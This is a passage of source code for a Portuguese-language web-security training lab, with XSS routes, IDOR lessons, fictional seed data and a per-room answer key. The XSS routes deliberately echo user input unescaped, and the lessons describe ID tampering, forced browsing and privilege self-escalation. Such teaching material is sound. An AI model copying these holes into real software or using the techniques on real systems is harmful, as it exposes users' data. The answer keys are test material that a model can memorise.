                    ${renderMenuXss()}
                    <button class="reset-btn" onclick="resetarMural('${sala}')">🔄 Resetar Mural do Lab ${sala}</button>
                    <a href="/xss" class="nav-link">↔️ Trocar de Sala</a>
                    <a href="/" class="nav-link">🏠 Voltar ao Hub</a>
                </div>

                <div class="main">
                    <div style="text-align: center; padding: 30px; background: linear-gradient(135deg, #28a745 0%, #1e7e34 100%); color: white; border-radius: 8px; margin-bottom: 30px;">
                        <h1 style="margin: 0; font-size: 28px;">🧪 Laboratório de Práticas — Lab ${sala}</h1>
                        <p style="margin: 10px 0 0 0; font-size: 16px; opacity: 0.9;">Cross-Site Scripting (XSS) - Aula Prática de Segurança</p>
                    </div>

                    <div style="background: #f0fff4; border-left: 4px solid #28a745; padding: 20px; margin-bottom: 30px; border-radius: 4px;">
                        <h3 style="color: #28a745; margin-top: 0;">📚 Como Usar:</h3>
                        <ol style="color: #555; line-height: 1.8; margin: 10px 0;">
                            <li>Escolha um payload no menu lateral (👈 são 10 testes diferentes)</li>
                            <li>Cole o payload na <strong>Busca de Produtos</strong> (XSS Refletido) ou no <strong>Mural de Recados</strong> (XSS Armazenado)</li>
                            <li>Observe o que acontece na tela (ou no Console do navegador, em alguns casos)</li>
                            <li>No mural, o payload fica salvo no banco e afeta só quem estiver no <strong>Lab ${sala}</strong>!</li>
                            <li>Se algo der errado ou a página ficar "quebrada" demais, os testes podem ser resetados a qualquer momento clicando no botão de reset mais abaixo no menu lateral (👇)</li>
                        </ol>
                    </div>

                    <div style="display: flex; gap: 20px; flex-wrap: wrap;">
                        <a href="/xss/${sala}/buscar" style="flex: 1; min-width: 240px; text-decoration: none; display: block; background: white; border: 2px solid #007bff; border-radius: 8px; padding: 25px; text-align: center; color: #333; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">
                            <div style="font-size: 36px;">🔍</div>
                            <h3 style="margin: 10px 0 5px 0; color: #007bff;">Busca de Produtos</h3>
                            <p style="color: #666; font-size: 13px;">XSS Refletido — o termo buscado aparece direto na resposta da página</p>
                        </a>
                        <a href="/xss/${sala}/mural" style="flex: 1; min-width: 240px; text-decoration: none; display: block; background: white; border: 2px solid #28a745; border-radius: 8px; padding: 25px; text-align: center; color: #333; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">
                            <div style="font-size: 36px;">📝</div>
                            <h3 style="margin: 10px 0 5px 0; color: #28a745;">Mural de Recados</h3>
                            <p style="color: #666; font-size: 13px;">XSS Armazenado — o que você escrever fica salvo só para o Lab ${sala}</p>
                        </a>
                    </div>
                </div>
            </div>
            <script>${scriptAccordionXss}</script>
        </body>
        </html>
    `);
});

// 2. ROTA DE BUSCA VULNERÁVEL A XSS REFLETIDO
//    A busca em si usa consulta parametrizada (não é o foco deste lab), mas o termo
//    digitado volta na tela sem nenhum escape de HTML — esse é o ERRO INTENCIONAL.
app.get('/xss/:sala/buscar', async (req, res) => {
    const { sala } = req.params;
    const termo = req.query.termo || '';

    let resultadosHtml = '<p style="color:#999;">Digite um termo e clique em Buscar para ver os produtos.</p>';
    if (termo) {
        try {
            const resultado = await pool.query(
                'SELECT nome, preco FROM produtos WHERE oculto = false AND nome ILIKE $1 ORDER BY nome',
                [`%${termo}%`]
            );
            if (resultado.rows.length === 0) {
                resultadosHtml = '<p style="color:#999;">Nenhum produto encontrado com esse termo.</p>';
            } else {
                resultadosHtml = '<table style="width:100%; border-collapse: collapse;">' +
                    '<thead><tr style="background:#f2f2f2;"><th style="padding:10px; border:1px solid #ddd; text-align:left;">Produto</th><th style="padding:10px; border:1px solid #ddd; text-align:left;">Preço</th></tr></thead><tbody>' +
                    resultado.rows.map(p => `<tr><td style="padding:10px; border:1px solid #ddd;">${escapeHtml(p.nome)}</td><td style="padding:10px; border:1px solid #ddd;">R$ ${p.preco}</td></tr>`).join('') +
                    '</tbody></table>';
            }
        } catch (error) {
            resultadosHtml = `<p style="color:#d9534f;">❌ Erro ao buscar: ${escapeHtml(error.message)}</p>`;
        }
    }

    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <title>Busca de Produtos - Lab XSS ${sala}</title>
        </head>
        <body style="font-family: sans-serif; max-width: 800px; margin: 40px auto; padding: 20px;">
            <h2>🔍 Busca de Produtos (XSS Refletido) — Lab ${sala}</h2>
            <p style="color:#666;">Pesquise produtos do catálogo. O termo buscado é exibido na tela exatamente como foi digitado.</p>

            <form action="/xss/${sala}/buscar" method="GET" style="margin-bottom: 20px; display: flex; gap: 10px;">
                <input type="text" name="termo" value="${termo}" style="flex: 1; padding:12px; border: 1px solid #ccc; border-radius:4px;" placeholder="Pesquisar produto... ou insira um payload XSS!">
                <button type="submit" style="padding:12px 25px; background:#007bff; color:white; border:none; border-radius:4px; font-weight:bold; cursor:pointer;">Buscar</button>
            </form>

            <div style="background:#f8f9fa; border: 1px solid #ddd; border-radius: 4px; padding: 20px;">
                <p style="color:#666; margin-top:0;">Resultado da busca para: <strong>${termo}</strong></p>
                ${resultadosHtml}
            </div>
            <br>
            <a href="/xss/${sala}" style="color:#28a745; text-decoration:none;">← Voltar para o Laboratório</a>
        </body>
        </html>
    `);
});

// 3. ROTA DO MURAL VULNERÁVEL A XSS ARMAZENADO (GET lista os comentários / POST salva um novo), isolada por sala
//    O ERRO INTENCIONAL: salva o texto puro no banco e renderiza o HTML/JS de volta sem escapar
app.get('/xss/:sala/mural', async (req, res) => {
    const { sala } = req.params;
    let comentariosHtml = '';
    try {
        const resultado = await pool.query('SELECT * FROM mural_comentarios WHERE sala = $1 ORDER BY id', [sala]);
        resultado.rows.forEach(c => {
            comentariosHtml += `
                <div style="background:white; border:1px solid #ddd; border-radius:4px; padding:15px; margin-bottom:12px;">
                    <strong style="color:#28a745;">${c.autor}</strong>
                    <span style="color:#999; font-size:11px;"> — ${new Date(c.criado_em).toLocaleString('pt-BR')}</span>
                    <p style="margin-top:8px; color:#333;">${c.mensagem}</p>
                </div>
            `;
        });
    } catch (error) {
        comentariosHtml = `<p style="color:#d9534f;">❌ Erro ao carregar comentários: ${error.message}</p>`;
    }

    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <title>Mural de Recados - Lab XSS ${sala}</title>
        </head>
        <body style="font-family: sans-serif; max-width: 1100px; margin: 40px auto; padding: 20px;">
            <h2>📝 Mural de Recados (XSS Armazenado) — Lab ${sala}</h2>
            <p style="color:#666;">Tudo que for postado aqui é salvo no banco e exibido só para quem estiver no Lab ${sala}.</p>

            <div style="background: #fffbea; border-left: 4px solid #ffc107; padding: 15px 20px; margin-bottom: 25px; border-radius: 4px;">
                <strong style="color:#856404;">💡 Dica de uso:</strong>
                <span style="color:#555;"> depois de publicar um payload, role até o formulário e tente preenchê-lo <strong>normalmente</strong> (como se fosse postar um comentário de verdade) para ver o que acontece com a página.</span>
            </div>

            <div style="display:flex; gap:25px; align-items:flex-start;">
                <div style="flex: 2; min-width: 0;">
                    <form action="/xss/${sala}/mural" method="POST" style="background:#f8f9fa; border: 1px solid #ddd; border-radius: 4px; padding: 20px; margin-bottom: 25px;">
                        <label style="font-weight:bold; display:block; margin-bottom:6px;">Seu nome:</label>
                        <input type="text" name="autor" required style="width:100%; padding:10px; margin-bottom:14px; border:1px solid #ccc; border-radius:4px; box-sizing:border-box;" placeholder="Ex: Aluno Teste">

                        <label style="font-weight:bold; display:block; margin-bottom:6px;">Mensagem:</label>
                        <textarea name="mensagem" required rows="3" style="width:100%; padding:10px; margin-bottom:14px; border:1px solid #ccc; border-radius:4px; box-sizing:border-box;" placeholder="Escreva uma mensagem... ou insira um payload XSS!"></textarea>

                        <button type="submit" style="padding:12px 25px; background:#28a745; color:white; border:none; border-radius:4px; font-weight:bold; cursor:pointer;">Publicar</button>
                    </form>

                    <h3 style="color:#333;">Comentários:</h3>
                    ${comentariosHtml || '<p style="color:#999;">Nenhum comentário ainda.</p>'}

                    <br>
                    <a href="/xss/${sala}" style="color:#28a745; text-decoration:none;">← Voltar para o Laboratório</a>
                </div>

                <div style="flex: 1; min-width: 260px; position: sticky; top: 20px;">
                    <div style="background:#1e1e1e; color:#0f0; border-radius:6px; padding:15px; font-family: monospace; font-size:12px;">
                        <strong style="color:#fff; font-family:sans-serif; display:block; margin-bottom:8px;">📡 Painel de Monitoramento</strong>
                        <p style="color:#ccc; font-family:sans-serif; font-size:11px; margin: 0 0 10px 0;">Este painel é apenas um espaço vazio — ele só passa a registrar o que você digita se <strong>alguém já tiver publicado o payload do Teste 10 (Keylogger)</strong> em algum comentário deste mural. É o próprio código do invasor que liga o monitoramento, não o laboratório.</p>
                        <div id="monitor-log" style="background:#000; border-radius:4px; padding:10px; height:180px; overflow-y:auto; word-break:break-all;">
                            <span style="color:#777;">&gt; nenhum keylogger ativo neste mural agora.</span>
                        </div>
                    </div>
                </div>
            </div>
        </body>
        </html>
    `);
});

app.post('/xss/:sala/mural', async (req, res) => {
    const { sala } = req.params;
    const { autor, mensagem } = req.body;

    try {
        await pool.query('INSERT INTO mural_comentarios (autor, mensagem, sala) VALUES ($1, $2, $3)', [autor, mensagem, sala]);
        res.redirect(`/xss/${sala}/mural`);
    } catch (error) {
        res.status(500).send(`
            <div style="font-family: monospace; background:#f8d7da; padding:30px; margin:50px auto; max-width: 800px; border-radius:8px; border: 1px solid #f5c6cb;">
                <h3 style="color: #721c24; margin-top:0;">💥 Erro ao salvar comentário!</h3>
                <p><strong>Mensagem do Postgres:</strong> <span style="color:red;">${error.message}</span></p>
                <br>
                <a href="/xss/${sala}/mural" style="padding:10px 20px; background:#721c24; color:white; text-decoration:none; border-radius:4px;">Voltar</a>
            </div>
        `);
    }
});

// 4. ROTA PARA RESETAR O MURAL DE UMA SALA (restaura os comentários originais daquela sala
//    e também o catálogo de produtos, já que a Busca usa essa mesma tabela e ela é compartilhada
//    com o lab de SQLi — sem isso, um teste de SQLi anterior poderia deixar a busca "estranha")
app.post('/xss/:sala/reset', async (req, res) => {
    const { sala } = req.params;
    const client = await pool.connect();
    try {
        await client.query('BEGIN');

        await client.query('DELETE FROM mural_comentarios WHERE sala = $1', [sala]);
        for (const c of SEED_COMENTARIOS) {
            await client.query('INSERT INTO mural_comentarios (autor, mensagem, sala) VALUES ($1, $2, $3)', [c.autor, c.mensagem, sala]);
        }

        await client.query('DELETE FROM produtos');
        await client.query('ALTER SEQUENCE produtos_id_seq RESTART WITH 1');
        for (const p of SEED_PRODUTOS) {
            await client.query('INSERT INTO produtos (nome, preco, oculto) VALUES ($1, $2, $3)', [p.nome, p.preco, p.oculto]);
        }

        await client.query('COMMIT');
        res.json({ sucesso: true, mensagem: `✅ Mural do Lab ${sala} e catálogo de produtos resetados com sucesso! Tudo voltou ao estado original.` });
    } catch (error) {
        await client.query('ROLLBACK');
        res.status(500).json({ sucesso: false, erro: error.message });
    } finally {
        client.release();
    }
});

// ============================================================
// LABORATÓRIO DE IDOR / QUEBRA DE CONTROLE DE ACESSO
// ============================================================

// Os dados (e portanto as respostas) são DIFERENTES entre a sala 1 (Sala A) e a sala 2 (Sala B)
// de propósito — assim um aluno de uma sala não consegue simplesmente perguntar a resposta
// para alguém da outra sala, porque o valor lá é outro.
const SEED_IDOR_PERFIS = {
    '1': [
        { numero: 1, nome: 'Você (Aluno QA)', email: 'aluno@lab.com', telefone: '(11) 90000-0001', cargo: 'Estagiário(a) de QA', salario: 1800.00, cpf: '000.000.000-00', bio: 'Aprendendo sobre segurança ofensiva', papel: 'aluno', token: 'TKN-AL-10001' },
        { numero: 2, nome: 'Marina Silva', email: 'marina.silva@empresa-lab.com', telefone: '(11) 98877-6655', cargo: 'Gerente Financeira', salario: 12300.00, cpf: '111.222.333-44', bio: 'Adoro café e planilhas de Excel', papel: 'aluno', token: 'TKN-MS-20045' },
        { numero: 3, nome: 'Carlos Mendes', email: 'carlos.mendes@empresa-lab.com', telefone: '(11) 97766-5544', cargo: 'Diretor de TI', salario: 18750.00, cpf: '123.456.789-00', bio: '30 anos de carreira em tecnologia', papel: 'aluno', token: 'TKN-CM-58231' },
        { numero: 4, nome: 'Beatriz Souza', email: 'beatriz.souza@empresa-lab.com', telefone: '(11) 96655-4433', cargo: 'Analista de Compras', salario: 5200.00, cpf: '222.333.444-55', bio: 'Apaixonada por logística', papel: 'aluno', token: 'TKN-BS-30099' },
        { numero: 5, nome: 'Roberto Alves', email: 'roberto.alves@empresa-lab.com', telefone: '(11) 95544-3322', cargo: 'Sócio-Diretor', salario: 42000.00, cpf: '333.444.555-66', bio: 'Fundador da empresa', papel: 'aluno', token: 'TKN-RA-40087' }
    ],
    '2': [
        { numero: 1, nome: 'Você (Aluno QA)', email: 'aluno@lab.com', telefone: '(21) 90000-0002', cargo: 'Estagiário(a) de QA', salario: 1800.00, cpf: '000.000.000-00', bio: 'Aprendendo sobre segurança ofensiva', papel: 'aluno', token: 'TKN-AL-90001' },
        { numero: 2, nome: 'Marina Silva', email: 'marina.silva@empresa-lab.com', telefone: '(21) 99123-4567', cargo: 'Gerente Financeira', salario: 12300.00, cpf: '444.555.666-77', bio: 'Adoro café e planilhas de Excel', papel: 'aluno', token: 'TKN-MS-77410' },
        { numero: 3, nome: 'Carlos Mendes', email: 'carlos.mendes@empresa-lab.com', telefone: '(21) 97788-2233', cargo: 'Diretor de TI', salario: 18750.00, cpf: '987.654.321-00', bio: '30 anos de carreira em tecnologia', papel: 'aluno', token: 'TKN-CM-90412' },
        { numero: 4, nome: 'Beatriz Souza', email: 'beatriz.souza@empresa-lab.com', telefone: '(21) 96644-1122', cargo: 'Analista de Compras', salario: 5200.00, cpf: '555.666.777-88', bio: 'Apaixonada por logística', papel: 'aluno', token: 'TKN-BS-66250' },
        { numero: 5, nome: 'Roberto Alves', email: 'roberto.alves@empresa-lab.com', telefone: '(21) 95533-9988', cargo: 'Sócio-Diretor', salario: 42000.00, cpf: '666.777.888-99', bio: 'Fundador da empresa', papel: 'aluno', token: 'TKN-RA-55310' }
    ]
};

const SEED_IDOR_COMPROVANTES = {
    '1': [
        { numero: 1001, perfil_numero: 1, valor: 1800.00, descricao: 'Pagamento de bolsa-auxílio mensal' },
        { numero: 1002, perfil_numero: 2, valor: 4750.00, descricao: 'Pagamento de comissão sobre vendas do trimestre' }
    ],
    '2': [
        { numero: 1001, perfil_numero: 1, valor: 1800.00, descricao: 'Pagamento de bolsa-auxílio mensal' },
        { numero: 1002, perfil_numero: 2, valor: 5300.00, descricao: 'Pagamento de bônus de desempenho do semestre' }
    ]
};

// Faturas usam números 6001/6002 (e não 2001/2002) só para não colidir visualmente com os
// comprovantes 1001/1002 quando o aluno estiver comparando as duas telas.
const SEED_IDOR_FATURAS = {
    '1': [
        { numero: 6001, perfil_numero: 1, valor: 49.90, descricao: 'Assinatura Mensal Básica' },
        { numero: 6002, perfil_numero: 4, valor: 899.90, descricao: 'Assinatura Anual Premium' }
    ],
    '2': [
        { numero: 6001, perfil_numero: 1, valor: 49.90, descricao: 'Assinatura Mensal Básica' },
        { numero: 6002, perfil_numero: 4, valor: 1290.00, descricao: 'Plano Corporativo Premium Anual' }
    ]
};

const SEED_IDOR_PEDIDOS = {
    '1': [
        { numero: 3001, perfil_numero: 1, item: 'Curso Online de Introdução à Cibersegurança', valor: 197.00 },
        { numero: 3002, perfil_numero: 5, item: 'Backup Completo do Banco de Dados Pessoal', valor: 1200.00 }
    ],
    '2': [
        { numero: 3001, perfil_numero: 1, item: 'Curso Online de Introdução à Cibersegurança', valor: 197.00 },
        { numero: 3002, perfil_numero: 5, item: 'Exportação Completa da Base de Clientes', valor: 1500.00 }
    ]
};

const SEED_IDOR_CHAMADOS = {
    '1': [
        { numero: 4001, perfil_numero: 1, assunto: 'Dúvida sobre meu boleto', mensagem: 'Olá, gostaria de saber o vencimento do meu boleto deste mês.' },
        { numero: 4002, perfil_numero: 2, assunto: 'Esqueci minha senha de administrador, me ajudem urgente', mensagem: 'Pessoal, preciso redefinir a senha mestre do sistema financeiro hoje ainda, é urgente.' }
    ],
    '2': [
        { numero: 4001, perfil_numero: 1, assunto: 'Dúvida sobre meu boleto', mensagem: 'Olá, gostaria de saber o vencimento do meu boleto deste mês.' },
        { numero: 4002, perfil_numero: 2, assunto: 'Não consigo acessar o painel de administrador, preciso de ajuda agora', mensagem: 'Pessoal, o painel administrativo não abre, preciso disso resolvido com urgência hoje.' }
    ]
};

const SEED_IDOR_MENSAGENS = {
    '1': [
        { numero: 5001, perfil_numero: 1, conteudo: 'Olá! Este é o seu canal privado com o suporte. Em que podemos ajudar?' },
        { numero: 5002, perfil_numero: 3, conteudo: 'Carlos, segue seu código de recuperação de acesso: 884215. Não compartilhe com ninguém.' }
    ],
    '2': [
        { numero: 5001, perfil_numero: 1, conteudo: 'Olá! Este é o seu canal privado com o suporte. Em que podemos ajudar?' },
        { numero: 5002, perfil_numero: 3, conteudo: 'Carlos, segue seu código de recuperação de acesso: 552031. Não compartilhe com ninguém.' }
    ]
};

// As 10 lições do laboratório de IDOR — cada uma explica o que o aluno faz normalmente,
// qual é a ação do ataque (manipulação) e a lição de segurança, seguindo o mesmo formato
// usado nas aulas: "O que o aluno faz" / "Ação do ataque" / "Lição".
const testesIdor = [
    {
        id: 'idor1',
        nome: '1️⃣ Manipulação de ID Sequencial (O Clássico)',
        oQueAlunoFaz: 'Você está logado e acessa o seu próprio comprovante de pagamento em /idor/SALA/comprovante/1001.',
        acaoDoAtaque: 'Troque o número na URL para 1002 e veja o comprovante de outra pessoa, que não deveria estar visível para você.',
        licao: 'IDs numéricos sequenciais e previsíveis facilitam a raspagem de dados (data scraping): basta ir somando 1 ao número para varrer os registros de todo mundo.',
        pergunta: 'Qual é a descrição (motivo do pagamento) que aparece no comprovante 1002?'
    },
    {
        id: 'idor2',
        nome: '2️⃣ Exposição de Dados Sigilosos no Perfil',
        oQueAlunoFaz: 'Acesse seu próprio perfil em /idor/SALA/perfil/1 e observe os campos sigilosos exibidos (telefone, CPF, salário).',
        acaoDoAtaque: 'Troque o número para 2 (perfil de Marina Silva) e veja que os mesmos dados sigilosos de outra pessoa aparecem, sem nenhuma verificação de que ela autorizou isso.',
        licao: 'Exibir dados sensíveis de qualquer registro sem checar se ele pertence ao usuário logado é uma quebra de controle de acesso horizontal — o tipo mais comum de IDOR.',
        pergunta: 'Qual é o telefone que aparece no perfil de Marina Silva (perfil 2)?'
    },
    {
        id: 'idor3',
        nome: '3️⃣ IDOR de Escrita (Alterando Dados de Outra Pessoa)',
        oQueAlunoFaz: 'Acesse /idor/SALA/perfil/1/editar e altere sua própria bio normalmente, para entender como o formulário funciona.',
        acaoDoAtaque: 'Troque o número na URL para /idor/SALA/perfil/2/editar (perfil de Marina) e altere a bio dela para exatamente esta frase: "Perfil comprometido via falha de IDOR". Depois acesse /idor/SALA/perfil/2 para ver o resultado.',
        licao: 'IDOR não serve só para ler dados de outras pessoas — quando a operação é de escrita, o impacto é ainda maior: você está alterando informação de quem não tem nenhuma relação com a sua conta.',
        pergunta: 'Depois de salvar a frase indicada na bio de Marina (perfil 2), um código de confirmação aparece na tela do perfil dela. Qual é esse código?'
    },
    {
        id: 'idor4',
        nome: '4️⃣ Controle de Acesso Vertical Quebrado (Forced Browsing)',
        oQueAlunoFaz: 'Navegue pelo laboratório normalmente — repare que não existe nenhum link de menu para uma área administrativa.',
        acaoDoAtaque: 'Mesmo assim, digite diretamente o endereço /idor/SALA/admin/usuarios na barra do navegador. Você, um "aluno" comum, consegue ver uma lista administrativa com o CPF de todo mundo, sem que o sistema pergunte se você tem permissão.',
        licao: 'Esconder um link do menu não é controle de acesso. Se a rota nunca verifica o papel de quem está pedindo, qualquer pessoa que descubra ou adivinhe a URL entra — isso é "Forced Browsing", falta de controle de acesso em nível de função.',
        pergunta: 'Qual é o CPF de Carlos Mendes que aparece nessa lista administrativa?'
    },
    {
        id: 'idor5',
        nome: '5️⃣ Escalonamento de Privilégio Auto-Atribuído',
        oQueAlunoFaz: 'Acesse /idor/SALA/conta para ver seu cargo atual ("Aluno") e o aviso de que o conteúdo de administrador está bloqueado. Depois acesse /idor/SALA/conta/editar para ver o formulário de edição.',
        acaoDoAtaque: 'No formulário, troque o campo "Tipo de conta" de Aluno para Administrador e clique em Salvar — sem precisar de nenhuma ferramenta extra. Depois volte para /idor/SALA/conta.',
        licao: 'Um formulário nunca deveria deixar o próprio usuário escolher seu nível de acesso. Se o servidor aceita e grava esse valor sem checar se quem está pedindo tem permissão para se tornar administrador, qualquer aluno consegue se autopromover.',
        pergunta: 'Qual é a senha do cofre de administradores revelada na sua conta depois da escalada de privilégio?'
    },
    {
        id: 'idor6',
        nome: '6️⃣ IDOR em API (Raspagem de Dados via JSON)',
        oQueAlunoFaz: 'Acesse a API /idor/SALA/api/perfil/1 direto no navegador e veja que ela devolve um JSON com seus próprios dados, incluindo um campo token.',
        acaoDoAtaque: 'Troque o número na URL para /idor/SALA/api/perfil/3 (Carlos Mendes) e veja o token dele aparecer no JSON, do mesmo jeito.',
        licao: 'APIs sofrem do mesmo problema que páginas HTML — e às vezes passam batido em testes porque "não é uma tela". Se o endpoint não confere quem está pedindo o recurso, um script simples consegue varrer os dados de todos os IDs em poucos segundos.',
        pergunta: 'Qual é o token que aparece no JSON do perfil 3 (Carlos Mendes)?'
    },
    {
        id: 'idor7',
        nome: '7️⃣ ID com Dígitos Invertidos (Ofuscação não é Proteção)',
        oQueAlunoFaz: 'Acesse sua fatura em /idor/SALA/fatura/1006 e note que o número não aparece "limpo" na URL — os dígitos estão invertidos (1006 ao contrário é 6001, o seu número real).',
        acaoDoAtaque: 'A fatura de Beatriz Souza é a 6002. Inverta os dígitos de cabeça (sem precisar de nenhum site ou ferramenta): 6002 invertido fica 2006. Acesse /idor/SALA/fatura/2006.',
        licao: 'Disfarçar um ID invertendo os dígitos (ou em Base64, hexadecimal etc.) não é criptografia — é só uma transformação simples de desfazer. Se a única "proteção" for esconder o formato do ID, ela não é proteção nenhuma.',
        pergunta: 'Qual é a descrição da fatura que você encontrou ao acessar o ID 2006 (6002 invertido)?'
    },
    {
        id: 'idor8',
        nome: '8️⃣ IDOR em Exclusão (Apagando Dados de Outra Pessoa)',
        oQueAlunoFaz: 'Acesse /idor/SALA/chamados para ver a lista dos SEUS chamados de suporte (só o seu, #4001).',
        acaoDoAtaque: 'Acesse diretamente /idor/SALA/chamado/4002 (um número que não está na sua lista) para ler o chamado de outra pessoa, e depois clique em "Excluir Chamado" — confirmando que conseguiu apagar um registro que não é seu.',
        licao: 'O impacto de um IDOR depende do verbo da operação: leitura já é grave, mas exclusão ou alteração sem checagem de propriedade pode causar perda de dados real para outras pessoas, de forma irreversível.',
        pergunta: 'Qual era o assunto do chamado #4002 antes de você excluí-lo?'
    },
    {
        id: 'idor9',
        nome: '9️⃣ IDOR via Parâmetro na Query String',
        oQueAlunoFaz: 'Acesse /idor/SALA/pedidos para ver seu próprio histórico de pedidos. Note que a URL na verdade é /idor/SALA/pedidos?usuario_numero=1.',
        acaoDoAtaque: 'Troque o valor de usuario_numero na URL para 5 (Roberto Alves) e veja o histórico de pedidos dele, uma pessoa completamente diferente de você.',
        licao: 'IDOR não acontece só na URL "bonita" (/recurso/123) — qualquer lugar onde um ID circula sem ser checado é um vetor: parâmetros de query string, corpo de formulário, cabeçalhos e até cookies podem ser manipulados do mesmo jeito.',
        pergunta: 'Qual item aparece no histórico de pedidos de Roberto Alves (perfil 5)?'
    },
    {
        id: 'idor10',
        nome: '🔟 IDOR em Mensagens Privadas',
        oQueAlunoFaz: 'Acesse sua própria conversa privada com o suporte em /idor/SALA/mensagem/5001.',
        acaoDoAtaque: 'Troque o número para /idor/SALA/mensagem/5002 e leia uma conversa privada que pertence a outra pessoa (Carlos Mendes), incluindo uma informação que deveria ser secreta.',
        licao: 'Conversas privadas são alvos especialmente sensíveis para IDOR, porque costumam conter dados que as empresas tratam como confidenciais (senhas, códigos de verificação) — e o atacante nem precisa ser sofisticado, só trocar um número na URL.',
        pergunta: 'Qual é o código de recuperação de acesso mencionado na conversa privada de Carlos Mendes?'
    }
];

// Respostas corretas de cada desafio — nunca são enviadas ao navegador, só comparadas no servidor.
// Cada sala tem o seu próprio conjunto, diferente do da outra sala (ver SEED_IDOR_* acima),
// então a resposta de um aluno da Sala A não serve para validar nada na Sala B.
const RESPOSTAS_IDOR = {
    '1': {
        idor1: 'Pagamento de comissão sobre vendas do trimestre',
        idor2: '(11) 98877-6655',
        idor3: 'IDOR-A-7731',
        idor4: '123.456.789-00',
        idor5: 'SENHA-MASTER-2024',
        idor6: 'TKN-CM-58231',
        idor7: 'Assinatura Anual Premium',
        idor8: 'Esqueci minha senha de administrador, me ajudem urgente',
        idor9: 'Backup Completo do Banco de Dados Pessoal',
        idor10: '884215'
    },
    '2': {
        idor1: 'Pagamento de bônus de desempenho do semestre',
        idor2: '(21) 99123-4567',
        idor3: 'IDOR-B-4408',
        idor4: '987.654.321-00',
        idor5: 'COFRE-ADMIN-7793',
        idor6: 'TKN-CM-90412',
        idor7: 'Plano Corporativo Premium Anual',
        idor8: 'Não consigo acessar o painel de administrador, preciso de ajuda agora',
        idor9: 'Exportação Completa da Base de Clientes',
        idor10: '552031'
    }
};

// Compara respostas ignorando acentos, maiúsculas/minúsculas e qualquer pontuação/espaçamento,
// para não reprovar o aluno por ter copiado o texto com uma formatação levemente diferente.
function normalizarRespostaIdor(s) {
    return String(s || '')
        .normalize('NFD').replace(/[̀-ͯ]/g, '')
        .toLowerCase()
        .replace(/[^a-z0-9]/g, '');
}

function renderMenuIdor(sala) {
    let menu = '';
    testesIdor.forEach(teste => {
        // As instruções são escritas com o placeholder "SALA", substituído aqui pela sala real
        // de quem está logado — sem isso, o aluno via literalmente "/idor/SALA/..." na tela.
        const oQueAlunoFaz = teste.oQueAlunoFaz.replace(/SALA/g, sala);
        const acaoDoAtaque = teste.acaoDoAtaque.replace(/SALA/g, sala);
        menu += `
            <div class="teste-item">
                <a href="javascript:void(0)" class="teste-link" id="link-${teste.id}" onclick="toggleTesteIdor('${teste.id}')">
                    <strong style="font-size:13px;" id="titulo-${teste.id}">${escapeHtml(teste.nome)}</strong>
                </a>
                <div class="teste-panel" id="panel-${teste.id}">
                    <p style="margin:6px 0; color:#333; font-size:12px;"><strong>📍 O que o aluno faz:</strong> ${escapeHtml(oQueAlunoFaz)}</p>
                    <p style="margin:6px 0; color:#a14e00; font-size:12px;"><strong>⚔️ Ação do ataque:</strong> ${escapeHtml(acaoDoAtaque)}</p>
                    <p style="margin:6px 0; color:#155724; font-size:12px;"><strong>🎓 Lição:</strong> ${escapeHtml(teste.licao)}</p>
                    <div style="background:white; border:1px solid #fd7e14; border-radius:4px; padding:10px; margin-top:10px;">
                        <p style="margin:0 0 6px 0; font-size:12px; font-weight:bold; color:#333;">${escapeHtml(teste.pergunta)}</p>
                        <input type="text" id="resposta-${teste.id}" placeholder="Cole aqui a resposta encontrada..." style="width:100%; padding:8px; margin-bottom:8px; border:1px solid #ccc; border-radius:4px; box-sizing:border-box; font-size:12px;">
                        <button onclick="validarTesteIdor('${teste.id}')" style="width:100%; padding:8px; background:#fd7e14; color:white; border:none; border-radius:4px; font-weight:bold; cursor:pointer; font-size:12px;">✅ Validar Resposta</button>
                        <p id="feedback-${teste.id}" style="margin:8px 0 0 0; font-size:11px;"></p>
                    </div>
                </div>
            </div>
        `;
    });
    return menu;
}

const sidebarStyleIdor = `
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: sans-serif; background: white; }
    .container { display: flex; min-height: 100vh; }
    .sidebar { width: 340px; background: #f5f5f5; padding: 20px; overflow-y: auto; border-right: 2px solid #ddd; }
    .main { flex: 1; padding: 30px; overflow-y: auto; background: white; }
    .sidebar h2 { margin-top: 0; margin-bottom: 6px; color: #333; font-size: 16px; }
    .sidebar p { font-size: 12px; color: #666; margin-bottom: 15px; }
    .teste-item { margin: 8px 0; }
    .teste-link { display:block; padding:12px; border-radius:4px; text-decoration:none; background:#f9f9f9; border:1px solid #ddd; color:#333; cursor:pointer; transition:all 0.2s; }
    .teste-link.active { background:#fd7e14; color:white; border:2px solid #c1590a; }
    .teste-link.concluido { border-left: 4px solid #28a745; }
    .teste-panel { display:none; background:#fff3e6; padding:12px; border-radius:4px; margin-top:6px; border-left:4px solid #fd7e14; }
    .teste-panel.open { display:block; }
    .reset-btn { display:block; width:100%; text-align:center; padding:12px; background:#6c757d; color:white; border:none; border-radius:4px; margin-top:20px; font-weight:bold; cursor:pointer; font-size:13px; }
    .nav-link { display:block; text-align:center; padding:10px; background:#6c757d; color:white; text-decoration:none; border-radius:4px; margin-top:10px; font-size: 13px; }
`;

const scriptAccordionIdor = `
    let testeAbertoIdor = null;
    function toggleTesteIdor(id) {
        const painelNovo = document.getElementById('panel-' + id);
        const linkNovo = document.getElementById('link-' + id);
        const reabrindoMesmo = testeAbertoIdor === id;

        if (testeAbertoIdor) {
            document.getElementById('panel-' + testeAbertoIdor).classList.remove('open');
            document.getElementById('link-' + testeAbertoIdor).classList.remove('active');
        }

        if (reabrindoMesmo) {
            testeAbertoIdor = null;
        } else {
            painelNovo.classList.add('open');
            linkNovo.classList.add('active');
            testeAbertoIdor = id;
        }
    }

    function atualizarContadorIdor(total) {
        const contador = document.getElementById('contador-progresso');
        if (contador) contador.textContent = total + ' / 10 concluídos';
    }

    function marcarConcluidoIdor(id) {
        const link = document.getElementById('link-' + id);
        const titulo = document.getElementById('titulo-' + id);
        if (link) link.classList.add('concluido');
        if (titulo && titulo.textContent.indexOf('✅') === -1) titulo.textContent = '✅ ' + titulo.textContent;
    }

    function desmarcarTodosIdor() {
        document.querySelectorAll('.teste-link.concluido').forEach(function(link) {
            link.classList.remove('concluido');
        });
